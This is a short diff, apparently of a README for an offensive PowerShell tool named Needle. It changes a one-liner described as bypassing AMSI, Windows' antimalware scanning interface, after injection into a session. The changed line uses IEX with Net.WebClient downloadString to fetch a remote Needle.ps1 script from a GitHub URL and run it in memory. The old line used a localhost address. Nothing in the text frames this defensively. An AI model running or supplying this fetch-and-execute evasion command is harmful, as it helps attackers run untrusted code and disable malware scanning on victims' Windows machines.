@@ -7,7 +7,7 @@ after inction in session run with : Needle
 
 bypass AMSI with oneliner :  
 
-IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8080/Needle.ps1')
+IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/ELMERIKH/Needle/main/Needle.ps1')
 
 USE WITH CAUTION 
 -----------
